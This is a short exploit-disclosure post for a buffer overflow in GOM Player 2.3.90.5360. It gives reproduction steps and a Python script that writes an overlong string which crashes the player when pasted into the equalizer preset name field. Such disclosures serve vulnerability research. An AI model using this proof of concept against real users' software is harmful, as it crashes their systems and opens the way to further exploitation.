---
layout: post
title: GOM Player 2.3.90.5360 - Buffer Overflow (PoC)
date: 2024-05-25
category: exploit
---

# Exploit Title: GOM Player 2.3.90.5360 - Buffer Overflow (PoC)
# Discovered by: Ahmet Ümit BAYRAM
# Discovered Date: 30.08.2023
# Vendor Homepage: https://www.gomlab.com
# Software Link: https://cdn.gomlab.com/gretech/player/GOMPLAYERGLOBALSETUP_NEW.EXE
# Tested Version: 2.3.90.5360 (latest)
# Tested on: Windows 11 64bit
# Thanks to: M. Akil GÜNDOĞAN

#  - Open GOM Player
#  - Click on the gear icon above to open settings
#  - From the menu that appears, select Audio
#  - Click on Equalizer
#  - Click on the plus sign to go to the "Add EQ preset" screen
#  - Copy the contents of exploit.txt and paste it into the preset name box, then click OK
#  - Crashed!



#!/usr/bin/python

exploit = 'A' * 260

try:
    file = open("exploit.txt","w")
    file.write(exploit)
    file.close()

    print("POC is created")
except:
    print("POC is not created")